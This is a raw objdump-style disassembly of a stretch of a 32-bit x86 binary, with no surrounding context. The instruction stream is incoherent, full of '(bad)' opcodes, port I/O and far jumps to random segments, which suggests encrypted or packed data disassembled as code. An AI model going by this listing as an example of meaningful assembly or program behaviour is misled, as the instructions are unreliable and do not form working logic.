  406d79:	sub    BYTE PTR [ebx],dh
  406d7b:	mov    ecx,0x981ab4e5
  406d80:	pop    ebx
  406d81:	pop    ebx
  406d82:	in     eax,0xa9
  406d84:	push   edi
  406d85:	aad    0xe5
  406d87:	cli    
  406d88:	mov    edx,0x6c5957c0
  406d8d:	mov    ds:0xcc89fe9c,al
  406d92:	mov    cs:0x96d9ecd6,eax
  406d98:	jbe    0x406d74
  406d9a:	imul   edx,DWORD PTR [ebp-0x1289b511],0x7ca07488
  406da4:	and    DWORD PTR [esi-0x27],ebp
  406da7:	mov    ah,0x28
  406da9:	adc    ecx,esp
  406dab:	mov    edx,0xdb0d2eb6
  406db0:	jg     0x406d37
  406db2:	add    ch,BYTE PTR ds:0xcdac4561
  406db8:	inc    ecx
  406db9:	in     al,dx
  406dba:	test   DWORD PTR [ebp-0x6e],esi
  406dbd:	xchg   ebx,eax
  406dbe:	pop    es
  406dbf:	mov    edi,DWORD PTR [eax-0x2e]
  406dc2:	(bad)  
  406dc3:	jmp    ebx
  406dc5:	rcl    eax,1
  406dc7:	das    
  406dc8:	sub    esp,DWORD PTR [ebx+0x17]
  406dcb:	sbb    DWORD PTR [edx-0x16],eax
  406dce:	or     al,0xc5
  406dd0:	aad    0xb4
  406dd2:	and    ebp,DWORD PTR [ebp+0x59]
  406dd5:	sbb    edi,DWORD PTR [ecx]
  406dd7:	loopne 0x406dcb
  406dd9:	mov    ds:0x1d14781b,eax
  406dde:	adc    al,0x1d
  406de0:	mov    ecx,0xf4f52a5b
  406de5:	add    al,0xa4
  406de7:	push   cs
  406de8:	jae    0x406d6b
  406dea:	das    
  406deb:	mov    BYTE PTR [ebx+ebx*1],0xe6
  406def:	and    BYTE PTR [ebx-0x64],cl
  406df2:	popf   
  406df3:	xchg   edx,eax
  406df4:	cwde   
  406df5:	bound  ebp,QWORD PTR ds:0x7a450cee
  406dfb:	dec    esp
  406dfc:	in     eax,0x94
  406dfe:	out    0xa,eax
  406e00:	addr16 test cl,dh
  406e03:	pop    ebp
  406e04:	scas   eax,DWORD PTR es:[edi]
  406e05:	adc    ah,0x6d
  406e08:	push   ss
  406e09:	mov    WORD PTR [ebp-0x4],ds
  406e0c:	jmp    0x86c4:0x4a05fcc9
  406e13:	mov    al,ds:0x62387d16
  406e18:	or     DWORD PTR [ebp+0x38],esp
  406e1b:	sbb    al,BYTE PTR [edi-0x3466cac9]
  406e21:	sbb    edx,edx
  406e23:	mov    ah,BYTE PTR [ecx+0x5f]
  406e26:	gs cdq 
  406e28:	mov    dl,0xfb
  406e2a:	and    al,0x93
  406e2c:	ins    DWORD PTR es:[edi],dx
  406e2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e2e:	adc    ebx,0x2038a913
  406e34:	or     ebx,DWORD PTR [ecx*2-0x5fc30d3a]
  406e3b:	pop    esi
  406e3c:	inc    esi
  406e3d:	frstor ds:0x25b3f4c2
  406e43:	pop    ecx
  406e44:	stos   BYTE PTR es:[edi],al
  406e45:	into   
  406e46:	loop   0x406e7d
  406e48:	jl     0x406e4e
  406e4a:	sbb    cl,BYTE PTR [edi+0x50844375]
  406e50:	mov    eax,DWORD PTR [eax+0x2f8d3846]
  406e56:	adc    DWORD PTR [edi],esp
  406e58:	or     al,0xd5
  406e5a:	adc    esi,ebp
  406e5c:	ret    0x241e
  406e5f:	dec    ebp
  406e60:	cmp    ecx,eax
  406e62:	jnp    0x406e91
  406e64:	xchg   ecx,eax
  406e65:	cmp    bh,bl
  406e67:	nop
  406e68:	ret    0x893
  406e6b:	mov    ecx,0x9f0d7b7c
  406e70:	xchg   edi,eax
  406e71:	cmp    al,0x5a
  406e73:	mov    ebp,0x2a14d76d
  406e78:	dec    edx
  406e79:	stos   BYTE PTR es:[edi],al
  406e7a:	(bad)  
  406e7b:	nop
  406e7c:	mov    ebp,DWORD PTR [edi+0x4]
  406e7f:	mov    DWORD PTR [eax-0x70469a45],0x6123dc54
  406e89:	dec    edx
  406e8a:	hlt    
  406e8b:	shl    BYTE PTR [edx+0x56],1
  406e8e:	fiadd  WORD PTR [esi]
  406e90:	in     eax,dx
  406e91:	sbb    al,0x4a
  406e93:	std    
  406e94:	lock mov esi,0x4b99dbdf
  406e9a:	sbb    bl,BYTE PTR [ecx]
  406e9c:	ficomp WORD PTR [ebp-0x6915a322]
  406ea2:	sub    esi,DWORD PTR [ebx-0x24fff677]
  406ea8:	jg     0x406e8a
  406eaa:	(bad)  
  406eab:	sub    ebx,DWORD PTR [eax-0x2c]
  406eae:	mov    dl,0x6c
  406eb0:	imul   ebp,DWORD PTR [ebx+ebp*8],0x36569834
  406eb7:	mov    edi,0x59e766fd
  406ebc:	bound  esp,QWORD PTR [esi-0x34dbb7e8]
  406ec2:	fimul  DWORD PTR [ebp-0x57638cad]
  406ec8:	popf   
  406ec9:	mov    ?,bx
  406ecc:	inc    esp
  406ecd:	arpl   bx,bx
  406ecf:	sbb    al,BYTE PTR [esi-0x70]
  406ed2:	ja     0x406ee1
  406ed4:	xchg   edi,eax
  406ed5:	inc    eax
  406ed6:	push   es
  406ed7:	cmc    
  406ed8:	mov    dh,0x65
  406eda:	and    ch,BYTE PTR [edi+eax*4]
  406edd:	add    al,bh
  406edf:	lock ret 0x9ec6
  406ee3:	xchg   ebx,eax
  406ee4:	daa    
  406ee5:	fbstp  TBYTE PTR [ebx+0x56]
  406ee8:	(bad)  
  406ee9:	mov    ecx,0x444a272e
  406eee:	jno    0x406f10
  406ef0:	push   esi
  406ef1:	inc    esp
  406ef2:	scas   eax,DWORD PTR es:[edi]
  406ef3:	jle    0x406eb0
  406ef5:	xchg   edx,eax
  406ef6:	xchg   esp,eax
  406ef7:	ret    
  406ef8:	adc    BYTE PTR [esi-0x34],dl
  406efb:	pop    esi
  406efc:	stc    
  406efd:	je     0x406f64
  406eff:	inc    esp
  406f00:	adc    DWORD PTR [edx-0x7e],edi
  406f03:	mov    al,0xef
  406f05:	xchg   edi,eax
  406f06:	mov    ?,WORD PTR [ecx-0x7e]
  406f09:	int    0x8b
  406f0b:	cld    
  406f0c:	imul   esi,DWORD PTR [edx],0x4f
  406f0f:	(bad)  [ecx-0x72]
  406f12:	sub    eax,0x9a8148f0
  406f17:	xor    al,0xf9
  406f19:	lahf   
  406f1a:	popa   
  406f1b:	scas   eax,DWORD PTR es:[edi]
  406f1c:	add    DWORD PTR [esi+eax*4],eax
  406f1f:	imul   DWORD PTR [esi-0x29]
  406f22:	xor    BYTE PTR ds:0x4d3527a7,ch
  406f28:	pop    ebp
  406f29:	ins    DWORD PTR es:[edi],dx
  406f2a:	and    DWORD PTR [edi+0x1a],ebp
  406f2d:	push   esi
  406f2e:	xchg   BYTE PTR [ebp-0x44],ch
  406f31:	and    ch,BYTE PTR [ecx]
  406f33:	popf   
  406f34:	leave  
  406f35:	push   es
  406f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f37:	ins    DWORD PTR es:[edi],dx
  406f38:	adc    dl,BYTE PTR [edx-0x8]
  406f3b:	lock jle 0x406f04
  406f3e:	jp     0x406f75
  406f40:	jo     0x406f3b
  406f42:	push   0x64fb51f5
  406f47:	test   BYTE PTR ds:0x128ced11,ah
  406f4d:	addr16 out dx,eax
  406f4f:	inc    eax
  406f50:	repz pop esp
  406f52:	pop    DWORD PTR [edx-0x1f31cbd1]
  406f58:	mov    al,0x96
  406f5a:	sub    edx,DWORD PTR [edx-0x7b9cc88e]
  406f60:	mov    bl,0xa3
  406f62:	mov    ecx,edx
  406f64:	dec    edx
  406f65:	call   0x9fc4:0x894963be
  406f6c:	rcl    ah,0x20
  406f6f:	inc    edi
  406f70:	ds adc ebx,esi
  406f73:	(bad)  
  406f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f75:	pop    ebp
  406f76:	add    BYTE PTR [ebx],0x94
  406f79:	sbb    ecx,esi
  406f7b:	sahf   
  406f7c:	lock inc edx
  406f7e:	cli    
  406f7f:	enter  0xb530,0x1f
  406f83:	das    
  406f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f85:	sar    edi,cl
  406f87:	fsubr  st(4),st
  406f89:	(bad)
  406f8c:	push   es
  406f8d:	cmp    ch,BYTE PTR [ecx-0x80]
  406f90:	xchg   ebx,eax
  406f91:	int    0x21
  406f93:	rcl    DWORD PTR [eax-0x413a2cad],cl
  406f99:	push   edx
  406f9a:	es jg  0x406fd0
  406f9d:	dec    ebp
  406f9e:	cmp    ecx,edx
  406fa0:	ins    DWORD PTR es:[edi],dx
  406fa1:	xchg   ebp,eax
  406fa2:	pop    ebx
  406fa3:	in     eax,dx
  406fa4:	lock mov edi,0xb36f70bf
  406faa:	test   DWORD PTR [esi-0x1f],ebp
  406fad:	sub    esp,DWORD PTR [ebp+0xe]
  406fb0:	inc    eax
  406fb1:	xchg   DWORD PTR [edi+0x25ced189],esi
  406fb7:	pop    edi
  406fb8:	add    edx,ecx
  406fba:	aam    0xa7
  406fbc:	(bad)  
  406fbe:	out    dx,al
  406fbf:	mov    dh,0xb7
  406fc1:	add    dh,BYTE PTR [ecx-0x6f]
  406fc4:	ja     0x406f4d
  406fc6:	jb     0x406f9f
  406fc8:	daa    
  406fc9:	ins    BYTE PTR es:[edi],dx
  406fca:	dec    edi
  406fcb:	mov    ebx,0x26f96d78
  406fd0:	push   eax
  406fd1:	pop    ebp
  406fd2:	imul   eax,DWORD PTR [eax-0x2c],0xb0d73257
  406fd9:	push   ecx
  406fda:	pop    ss
  406fdb:	cmp    esi,DWORD PTR [edx-0x6bb759]
  406fe1:	rcl    bl,cl
  406fe3:	add    esi,esi
  406fe5:	or     eax,0xa918c56
  406fea:	in     eax,dx
  406feb:	lea    edx,[edx]
  406fed:	cdq    
  406fee:	push   edi
  406fef:	mov    gs,esp
  406ff1:	cmp    eax,0x9ae8227c
  406ff6:	icebp  
  406ff7:	loope  0x407036
  406ff9:	in     eax,dx
  406ffa:	cdq    
  406ffb:	mov    dl,0xc
  406ffd:	fbld   TBYTE PTR [edx+0x28c23732]
  407003:	out    dx,eax
  407004:	ret    
  407005:	mov    eax,ds:0xbca55237
  40700a:	xor    edx,DWORD PTR [ebp+0x5b93f8b3]
  407010:	sub    DWORD PTR [edi],ebp
  407012:	pop    ebp
  407013:	dec    ebp
  407014:	bt     DWORD PTR [edi],0x4f
  407018:	mov    bl,0x37
  40701a:	js     0x407019
  40701c:	(bad)  
  40701d:	fs sub bl,bl
  407020:	clc    
  407021:	xchg   DWORD PTR [ebx+0x73f8329d],ebx
  407027:	out    dx,al
  407028:	ret    
  407029:	xchg   ecx,eax
  40702a:	and    BYTE PTR [esi],ch
  40702c:	ss scas eax,DWORD PTR es:[edi]
  40702e:	mov    al,0x88
  407030:	xchg   esp,eax
  407031:	adc    dh,bl
  407033:	lods   al,BYTE PTR ds:[esi]
  407034:	push   0x29e06558
  407039:	imul   ah
  40703b:	mov    dl,0x69
  40703d:	(bad)  
  40703e:	call   0xf3b7:0x50a3db42
  407045:	ret    
  407046:	jbe    0x40709b
  407048:	xor    eax,0x5a8ba7dd
  40704d:	mov    ebp,0x79fe4783
  407052:	std    
  407053:	mov    edi,0xaf8f76f9
  407058:	lahf   
  407059:	outs   dx,DWORD PTR ds:[esi]
  40705a:	dec    edi
  40705b:	cmp    eax,0x5c01bba1
  407060:	daa    
  407061:	in     al,dx
  407062:	pop    esi
  407063:	clc    
  407064:	out    dx,al
  407065:	inc    DWORD PTR [edx-0x34]
  407068:	ins    DWORD PTR es:[edi],dx
  407069:	pop    edx
  40706a:	daa    
  40706b:	stos   BYTE PTR es:[edi],al
  40706c:	int    0x8
  40706e:	into   
  40706f:	dec    ebp
  407070:	imul   edi,esi,0xffffffd8
  407073:	and    al,0x66
  407075:	xor    DWORD PTR [ebx],edx
  407077:	jnp    0x40704b
  407079:	stos   BYTE PTR es:[edi],al
  40707a:	call   0x96d380a3
  40707f:	rcl    BYTE PTR [edi+0x64893d],cl
  407085:	pop    ss
  407086:	(bad)  
  407087:	pop    edi
  407088:	cmp    al,0x39
  40708a:	int3   
  40708b:	push   ebp
  40708c:	add    eax,DWORD PTR [ecx+0x47]
  40708f:	cmp    eax,0x3a8d27d2
  407094:	push   ss
  407095:	mov    DWORD PTR [edi+0x5ef6c7d],ecx
  40709b:	jp     0x407022
  40709d:	adc    DWORD PTR [eax+0x23],0x1ad2445a
  4070a4:	clc    
  4070a5:	das    
  4070a6:	jle    0x40709f
  4070a8:	sub    eax,0xdb31f3d
  4070ad:	mov    BYTE PTR [edx],dh
  4070af:	xor    esi,edi
  4070b1:	push   edi
  4070b2:	out    dx,al
  4070b3:	shl    esp,cl
  4070b5:	cmp    eax,0x7c21bd94
  4070ba:	(bad)  [edx+0x1211519e]
  4070c0:	sti    
  4070c1:	push   0xffffffaa
  4070c3:	mov    ah,BYTE PTR [ecx-0x42]
  4070c6:	cwde   
  4070c7:	int    0xf9
  4070c9:	shr    DWORD PTR [ebp+esi*4+0x1495f767],cl
  4070d0:	fst    DWORD PTR [esi]
  4070d2:	mov    ds:0xa997d5d4,al
  4070d7:	out    0xf0,eax
  4070d9:	add    ah,0xd2
  4070dc:	lods   eax,DWORD PTR ds:[esi]
  4070dd:	jno    0x4070a3
  4070df:	jle    0x4070e5
  4070e1:	js     0x407142
  4070e3:	jns    0x407081
  4070e5:	mov    ds:0x2eb4e8f9,al
  4070ea:	lea    esi,[ecx-0x11]
  4070ed:	(bad)  
  4070ee:	inc    edi
  4070ef:	xchg   edi,eax
  4070f0:	inc    edx
  4070f1:	dec    edx
  4070f2:	sub    bh,BYTE PTR [edx]
  4070f4:	pop    ebx
  4070f5:	inc    ebx
  4070f6:	push   0x4ff26129
  4070fb:	test   eax,0xdb0f8627
  407100:	pop    ebx
  407101:	cmp    eax,edx
  407103:	mov    BYTE PTR [esi-0x70202d27],al
  407109:	jmp    0x8a0e8a4b
  40710e:	(bad)  
  40710f:	and    ebx,DWORD PTR [ebx+0x18]
  407112:	mov    ds:0xd47820be,al
  407117:	add    eax,0xa070ef4f
  40711c:	jp     0x40714b
  40711e:	call   0x7531:0x3880180c
  407125:	or     dl,BYTE PTR [esi-0x6a32cc21]
  40712b:	pop    edi
  40712c:	mov    ds:0x5df92818,eax
  407131:	enter  0x69d9,0x1f
  407135:	and    eax,0xd22270af
  40713a:	jae    0x407187
  40713c:	push   edx
  40713d:	or     ah,BYTE PTR [edx]
  40713f:	icebp  
  407140:	mov    esp,DWORD PTR [ecx]
  407142:	jb     0x4070d2
  407144:	js     0x407134
  407146:	jecxz  0x40715a
  407148:	xchg   esp,eax
  40714a:	push   edx
  40714b:	xchg   edx,eax
  40714c:	push   edi
  40714d:	mov    al,ds:0xf16e7a90
  407152:	pop    edi
  407153:	shr    DWORD PTR [edx],0xd8
  407156:	jno    0x40714f
  407158:	dec    eax
  407159:	fisubr DWORD PTR ds:0xe90645af
  40715f:	jb     0x40717e
  407161:	push   ebx
  407162:	lods   al,BYTE PTR ds:[esi]
  407163:	xchg   esp,eax
  407164:	int3   
  407165:	pop    ecx
  407166:	push   es
  407167:	dec    edi
  407168:	in     eax,dx
  407169:	out    dx,eax
  40716a:	and    BYTE PTR [eax+ebx*1-0x64],dh
  40716e:	jmp    0x407195
  407170:	je     0x407162
  407172:	add    cl,al
  407174:	imul   ecx,ecx,0x13
  407177:	pop    eax
  407178:	mov    WORD PTR [eax],?
  40717a:	in     eax,0xfb
  40717c:	in     eax,dx
  40717d:	jbe    0x4071b7
  40717f:	add    BYTE PTR [ecx],cl
  407181:	or     eax,0x73db5c78
  407186:	lods   al,BYTE PTR ds:[esi]
  407187:	jns    0x407176
  407189:	icebp  
  40718a:	stos   BYTE PTR es:[edi],al
  40718b:	or     al,0x70
  40718d:	xchg   edx,eax
  40718e:	sub    BYTE PTR [eax-0x13],ah
  407191:	cdq    
  407192:	mov    cl,0x4b
  407194:	xchg   edi,eax
  407195:	fcomp  st(7)
  407197:	xor    BYTE PTR ds:0xd530f07c,ah
  40719d:	push   ds
  40719e:	gs cwde 
  4071a0:	push   0xffffffd5
  4071a2:	or     eax,0x5f2ea59e
  4071a7:	push   0x4c
  4071a9:	sbb    DWORD PTR [edi+0x60],ecx
  4071ac:	fist   WORD PTR [ebp+0x62]
  4071af:	jl     0x407215
  4071b1:	cmp    BYTE PTR [eax-0x195cb112],cl
  4071b7:	mov    ah,0x10
  4071b9:	xor    dh,dh
  4071bb:	fcmovbe st,st(6)
  4071bd:	addr16 push edi
  4071bf:	cwde   
  4071c0:	jbe    0x407188
  4071c2:	repnz jmp 0x8704:0xf0375efb
  4071ca:	loope  0x407239
  4071cc:	sub    al,0xed
  4071ce:	test   DWORD PTR [ebp+0xe],esi
  4071d1:	and    DWORD PTR [eax+0x6b],0x6d
  4071d5:	xor    DWORD PTR es:[ebx-0x33ddb661],ecx
  4071dc:	shr    DWORD PTR [ebx],0x60
  4071df:	jg     0x4071d8
  4071e1:	pop    edi
  4071e2:	mov    ebx,0x55259646
  4071e7:	xchg   esi,eax
  4071e8:	jecxz  0x40716a
  4071ea:	mov    edi,0x69ef1e1
  4071ef:	hlt    
  4071f0:	and    DWORD PTR [edx],ecx
  4071f2:	mov    eax,ds:0xec488f6a
  4071f7:	loope  0x4071da
  4071f9:	and    eax,0xc5d815dc
  4071fe:	add    ebx,eax
  407200:	jo     0x407232
  407202:	retf   0xb63
  407205:	out    dx,eax
  407206:	mov    ebx,0x6417e2d3
  40720b:	repz mov edi,DWORD PTR [ecx+0x4456f756]
  407212:	lds    eax,FWORD PTR [edx-0x2e]
  407215:	fisub  DWORD PTR [edx+0xaba752c]
  40721b:	hlt    
  40721c:	data16 clc 
  40721e:	jmp    0xd60fb7e2
  407223:	and    ah,BYTE PTR [esi]
  407225:	sbb    ecx,DWORD PTR ds:0xcce1e4c6
  40722b:	xchg   ebp,eax
  40722c:	and    al,0xd9
  40722e:	sbb    esi,DWORD PTR [ebp+0xb]
  407231:	mov    ds:0xf1b9dbc0,al
  407236:	jp     0x4072b5
  407238:	enter  0x543,0x13
  40723c:	xor    DWORD PTR [edi-0x3f],0xa06e5dc7
  407243:	inc    eax
  407244:	inc    ebp
  407245:	inc    eax
  407247:	test   BYTE PTR [ecx+0x6fa70b1b],bh
  40724d:	jo     0x40721d
  40724f:	lock sub ecx,DWORD PTR [edi]
  407252:	fiadd  WORD PTR [ebp-0x73cdbef7]
  407258:	mov    ch,ch
  40725a:	repnz or BYTE PTR [edx-0x66],ah
  40725e:	scas   eax,DWORD PTR es:[edi]
  40725f:	sbb    al,0xd7
  407261:	cmp    eax,0xa62f4582
  407266:	arpl   WORD PTR [edx+0x3e],bp
  407269:	mov    dl,0x5a
  40726b:	jecxz  0x4071f1
  40726d:	stc    
  40726e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40726f:	in     al,dx
  407270:	shl    esi,cl
  407272:	sbb    DWORD PTR [edx],esi
  407274:	sub    al,0xd1
  407276:	xchg   ebx,eax
  407277:	mov    eax,ds:0xc1dcd9b6
  40727c:	sbb    DWORD PTR [edi+0x44],esi
  40727f:	add    dh,BYTE PTR [edi-0x533cecdb]
  407285:	cld    
  407286:	into   
  407287:	inc    edx
  407288:	out    dx,al
  407289:	test   al,0xe1
  40728b:	push   es
  40728c:	push   edx
  40728d:	jmp    0x3702:0x7973b2aa
  407294:	inc    ecx
  407295:	sbb    cl,BYTE PTR [edi+0x5e]
  407298:	repz mov dh,al
  40729b:	mov    edi,0x53e92229
  4072a0:	mov    al,0xda
  4072a2:	inc    ebp
  4072a3:	inc    ecx
  4072a4:	add    BYTE PTR [si+0x26],0x6c
  4072a9:	sahf   
  4072aa:	inc    esi
  4072ab:	push   es
  4072ac:	in     al,0x20
  4072ae:	push   ds
  4072af:	mov    ebx,0x3f0393af
  4072b4:	mov    ds:0x48a09dfe,al
  4072b9:	outs   dx,BYTE PTR ds:[esi]
  4072ba:	jg     0x4072a1
  4072bc:	sbb    bl,dl
  4072be:	popf   
  4072bf:	jle    0x4072de
  4072c1:	mov    WORD PTR [esi+0x6f],cs
  4072c4:	inc    esp
  4072c5:	sbb    DWORD PTR ds:0xf87d5b1,esp
  4072cb:	jns    0x4072ca
  4072cd:	in     eax,0xe1
  4072cf:	adc    BYTE PTR [esi+0x1f375255],0x66
  4072d6:	add    cl,BYTE PTR [eax-0x46]
  4072d9:	mov    ecx,0xdedc2a43
  4072de:	pop    ds
  4072df:	jae    0x4072f2
  4072e1:	cmp    bl,BYTE PTR [ebx-0x5b]
  4072e4:	dec    edi
  4072e5:	lock jl 0x407275
  4072e8:	dec    ebp
  4072e9:	dec    edx
  4072ea:	inc    esp
  4072eb:	push   es
  4072ec:	push   edi
  4072ed:	push   ecx
  4072ee:	or     BYTE PTR [edx+esi*8-0x1e],cl
  4072f2:	add    eax,0x6ddbfb2a
  4072f7:	in     eax,dx
  4072f8:	jne    0x407288
  4072fa:	sbb    BYTE PTR [ebx+0x1209dc25],al
  407300:	push   0x79fdbc51
  407305:	cs push ds
  407307:	call   0x4f74:0x9a93438a
  40730e:	jns    0x4072ed
  407310:	inc    esp
  407311:	jmp    0x40738d
  407313:	cwde   
  407314:	cmp    ah,BYTE PTR [edi-0x158b57d6]
  40731a:	pop    ebp
  40731b:	arpl   WORD PTR [ebx],ax
  40731d:	aas    
  40731e:	retf   
  40731f:	fcom   QWORD PTR [ebp+0x685851dd]
  407325:	leave  
  407326:	adc    al,0x2d
  407328:	push   cs
  407329:	mov    al,0xb2
  40732b:	test   eax,0x691ae429
  407330:	daa    
  407331:	daa    
  407332:	jnp    0x4072d8
  407334:	lds    esp,FWORD PTR [eax+0x49]
  407337:	add    al,0x57
  407339:	adc    ah,BYTE PTR ds:0x557740ed
  40733f:	xchg   edx,eax
  407340:	sbb    eax,0x189ffae0
  407345:	mov    eax,ds:0x81dffd58
  40734a:	push   ds
  40734b:	jecxz  0x40736a
  40734d:	adc    eax,0xdcfd21b6
  407352:	adc    ecx,edi
  407354:	fsub   DWORD PTR [esi+0x2d9811c3]
  40735a:	sbb    al,0xaa
  40735c:	jmp    DWORD PTR [ecx+0x443b19de]
  407362:	push   ds
  407363:	fsubr  QWORD PTR [edx]
  407365:	inc    esi
  407366:	rcl    BYTE PTR [eax-0x17],1
  407369:	faddp  st(0),st
  40736b:	cwde   
  40736c:	shl    DWORD PTR [ecx-0x4f649c19],0x11
  407373:	pusha  
  407374:	xchg   BYTE PTR [edi+0xe],ah
  407377:	push   ss
  407378:	in     al,dx
  407379:	xor    eax,0x582cc21d
  40737e:	fbstp  TBYTE PTR [edx+eiz*4]
  407381:	ins    DWORD PTR es:[edi],dx
  407382:	(bad)  
  407383:	std    
  407384:	xchg   ebp,eax
  407385:	lea    edx,[edx-0x4b]
  407388:	pop    ds
  407389:	xchg   edi,eax
  40738a:	or     al,0x48
  40738c:	inc    ebp
  40738d:	test   DWORD PTR [ecx+0x228e80d5],0xf19621de
  407397:	add    DWORD PTR [ebp+0x69],ebp
  40739a:	jns    0x407320
  40739c:	test   al,0xce
  40739e:	loop   0x4073a9
  4073a0:	repz mov dl,0x7
  4073a3:	int    0x30
  4073a5:	(bad)  
  4073a6:	adc    BYTE PTR [esi+0x11d4d265],ah
  4073ac:	inc    ecx
  4073ad:	mov    dh,0x6a
  4073af:	in     al,dx
  4073b0:	xlat   BYTE PTR ds:[ebx]
  4073b1:	sahf   
  4073b2:	mov    ch,0xb0
  4073b4:	adc    ebp,0xffffffd4
  4073b7:	out    dx,eax
  4073b8:	scas   al,BYTE PTR es:[edi]
  4073b9:	pop    esp
  4073ba:	mov    ah,0x0
  4073bc:	jb     0x4073ed
  4073be:	out    dx,eax
  4073bf:	and    ecx,esp
  4073c1:	sar    DWORD PTR [ebx+0xc],cl
  4073c4:	inc    edi
  4073c5:	add    esp,esp
  4073c7:	mov    DWORD PTR [esi-0x2fe08a7f],eax
  4073cd:	or     bh,bl
  4073cf:	out    dx,eax
  4073d0:	xrelease xchg DWORD PTR [esi+0x4800086a],edi
  4073d7:	xor    DWORD PTR [ecx-0x24720f5],ecx
  4073dd:	mov    bh,0x76
  4073df:	add    eax,0x90d1a59e
  4073e4:	fsub   QWORD PTR [esi+ebp*8-0x5c]
  4073e8:	sub    al,0x3a
  4073ea:	popa   
  4073eb:	mov    bl,0x42
  4073ed:	call   0x9d32:0x1fa04fc7
  4073f4:	jmp    0x81b:0xfebc215c
  4073fb:	in     al,0x24
  4073fd:	adc    eax,0x60da1587
  407402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407403:	stc    
  407404:	test   DWORD PTR [ebp-0x74],0x6bde9aa8
  40740b:	mov    eax,ebx
  40740d:	fldcw  WORD PTR [eax+eiz*4+0x20]
  407411:	in     eax,0x59
  407413:	cmc    
  407414:	xchg   ecx,ecx
  407416:	adc    DWORD PTR [ecx+0xff36cbf],esp
  40741c:	imul   ebp,ecx,0xe62e2626
  407422:	add    ebp,DWORD PTR [edx+0x4b]
  407425:	dec    ebp
  407426:	dec    edx
  407427:	inc    edi
  407428:	test   BYTE PTR [edx],0xd5
  40742b:	xchg   esp,ebx
  40742d:	xor    DWORD PTR [ecx-0x4c],0x71
  407431:	fsubr  QWORD PTR [ebp+edi*8-0x1bb9fd1b]
  407438:	stos   BYTE PTR es:[edi],al
  407439:	xchg   esp,eax
  40743a:	jecxz  0x4073fd
  40743c:	xchg   dh,cl
  40743e:	mov    eax,0x9471ea01
  407443:	mov    bh,0xd2
  407445:	adc    DWORD PTR [ebp+0x66],esp
  407448:	daa    
  407449:	call   0x97fe9b42
  40744e:	lods   al,BYTE PTR ds:[esi]
  40744f:	mov    dl,0x33
  407451:	pop    eax
  407452:	xor    BYTE PTR [ecx],dl
  407454:	xchg   edi,eax
  407455:	lahf   
  407456:	sahf   
  407457:	mov    ecx,0x4ff5ab41
  40745c:	pop    edi
  40745d:	loop   0x4074da
  40745f:	aaa    
  407460:	dec    ebx
  407461:	not    BYTE PTR [eax+0x388ec406]
  407467:	push   ebp
  407468:	scas   al,BYTE PTR es:[edi]
  407469:	pop    eax
  40746a:	xchg   BYTE PTR [edx+edx*8],ah
  40746d:	daa    
  40746e:	and    eax,0xf34070dd
  407473:	xchg   edx,eax
  407474:	push   es
  407475:	(bad)  
  407477:	pop    ebp
  407478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407479:	out    dx,al
  40747a:	sub    al,0x4a
  40747c:	sub    eax,0xef77856a
  407481:	sub    al,0xde
  407483:	nop
  407484:	jmp    0x57c0:0x272fe465
  40748b:	sbb    DWORD PTR [esi-0x1],ebp
  40748e:	std    
  40748f:	jb     0x40743b
  407491:	mov    edx,0xaa66bf9d
  407496:	in     al,dx
  407497:	out    dx,eax
  407498:	repz push DWORD PTR [esi+0x577fde95]
  40749f:	dec    edi
  4074a0:	or     eax,0xcfb98b0a
  4074a5:	rcr    DWORD PTR [edx+0xb],0x93
  4074a9:	jbe    0x4074f0
  4074ab:	fiadd  DWORD PTR ds:0x47a20b00
  4074b1:	stos   BYTE PTR es:[edi],al
  4074b2:	jns    0x4074be
  4074b4:	lods   al,BYTE PTR ds:[esi]
  4074b5:	loop   0x4074d8
  4074b7:	jbe    0x407449
  4074b9:	cdq    
  4074ba:	sub    DWORD PTR [edi-0x1041a35],esi
  4074c0:	jmp    0x9b4b:0xa4d8d4c8
  4074c7:	push   edx
  4074c8:	lahf   
  4074c9:	sub    DWORD PTR [esi+0x27],edx
  4074cc:	popf   
  4074cd:	mov    edi,0xd12e99dc
  4074d2:	pop    ds
  4074d3:	adc    eax,0x7fdf98cb
  4074d8:	js     0x40747c
  4074da:	cwde   
  4074db:	dec    edx
  4074dc:	mov    edx,0x84e09e4e
  4074e1:	rcr    DWORD PTR [eax+edx*2+0x56a762a5],1
  4074e8:	inc    ebx
  4074e9:	fbstp  TBYTE PTR [ebx]
  4074eb:	icebp  
  4074ec:	call   0xc9bc:0xa8f12e91
  4074f3:	fisubr DWORD PTR [ecx+0x4]
  4074f6:	add    BYTE PTR [ebp+0x7b],dh
  4074f9:	add    al,0xc4
  4074fb:	add    ebx,ecx
  4074fd:	mov    BYTE PTR [ecx+0x2992e706],ch
  407503:	ins    BYTE PTR es:[edi],dx
  407504:	clc    
  407505:	ror    cl,cl
  407507:	xchg   ebx,eax
  407508:	jp     0x407511
  40750a:	xchg   BYTE PTR [edi],al
  40750c:	int3   
  40750d:	push   edi
  40750e:	stc    
  40750f:	cmp    DWORD PTR [ebp+0x64],esp
  407512:	pop    ss
  407513:	not    BYTE PTR [eax+0x3]
  407516:	lds    ebx,FWORD PTR [ebp+0x2ddc7dd9]
  40751c:	jbe    0x407520
  40751e:	or     BYTE PTR [eax],bh
  407520:	ins    DWORD PTR es:[edi],dx
  407521:	dec    edx
  407522:	xor    bh,BYTE PTR [esi-0x2b3276c9]
  407528:	mov    ebx,0xfaa52f5a
  40752d:	sub    ah,bl
  40752f:	jp     0x407571
  407531:	xor    eax,eax
  407533:	push   0xfffffff8
  407535:	cmp    BYTE PTR [esi+0x6f247255],0xf3
  40753c:	clc    
  40753d:	jge    0x40752b
  40753f:	inc    esi
  407540:	pop    ecx
  407541:	xchg   ecx,eax
  407542:	or     ch,0xcb
  407545:	dec    edi
  407546:	jno    0x4074d0
  407548:	in     eax,dx
  407549:	leave  
  40754a:	aas    
  40754b:	pop    edi
  40754c:	lods   eax,DWORD PTR ds:[esi]
  40754d:	cld    
  40754e:	test   DWORD PTR [ecx-0x729795a],ecx
  407554:	or     DWORD PTR [ecx+0x2f],edx
  407557:	push   ecx
  407558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407559:	add    BYTE PTR [ebp+0x78ab3db2],ah
